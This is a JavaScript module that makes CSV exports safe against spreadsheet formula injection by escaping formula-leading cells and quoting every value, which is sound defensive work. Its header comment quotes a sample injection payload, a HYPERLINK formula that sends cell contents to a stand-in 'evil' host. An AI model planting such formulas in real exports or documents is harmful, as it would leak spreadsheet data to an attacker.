/**
 * Spreadsheet-safe CSV (§12: "export ... formula/CSV injection safe").
 *
 * A CSV is not a passive file. Excel, LibreOffice and Google Sheets evaluate any cell that
 * begins with =, +, - or @ as a formula. A counterparty name or a transaction note is attacker
 * -controlled text that travels straight into an export an accountant then opens, so a note
 * reading =HYPERLINK("http://evil/?"&A1,"invoice") becomes a live exfiltration link the moment
 * the file is opened — no macros, no warning.
 *
 * The guard is to prefix such a cell with an apostrophe, which spreadsheets treat as "this is
 * text". The value stays readable; it simply stops being executable.
 */

/** Leading whitespace counts: spreadsheets trim before deciding a cell is a formula. */
const FORMULA_START = /^[\s ]*[=+\-@]/;
/** A leading tab or carriage return can also start a formula in some readers. */
const CONTROL_START = /^[\t\r]/;

export function spreadsheetSafe(value) {
  if (value === null || value === undefined) return "";
  if (typeof value === "number" || typeof value === "bigint" || typeof value === "boolean") {
    return String(value);
  }
  const text = typeof value === "object" ? JSON.stringify(value) : String(value);
  return FORMULA_START.test(text) || CONTROL_START.test(text) ? `'${text}` : text;
}

/** Always quoted, quotes doubled: a comma, a newline or a quote in the data cannot break out. */
export const csvCell = (value) => `"${spreadsheetSafe(value).replaceAll('"', '""')}"`;

/**
 * A CSV with a BOM so Kurdish and Arabic text opens correctly in Excel, CRLF line endings as
 * the format specifies, and every cell neutralised.
 */
export function toCsv(rows) {
  const list = (rows || []).filter(Array.isArray);
  if (!list.length) return "﻿";
  return `﻿${list.map((row) => row.map(csvCell).join(",")).join("\r\n")}`;
}

/** Builds from records against an explicit header order, so columns never shuffle. */
export function toCsvFromRecords(records, headers) {
  const keys = headers || [...new Set((records || []).flatMap((r) => Object.keys(r || {})))].sort();
  return toCsv([keys, ...(records || []).map((r) => keys.map((k) => r?.[k]))]);
}
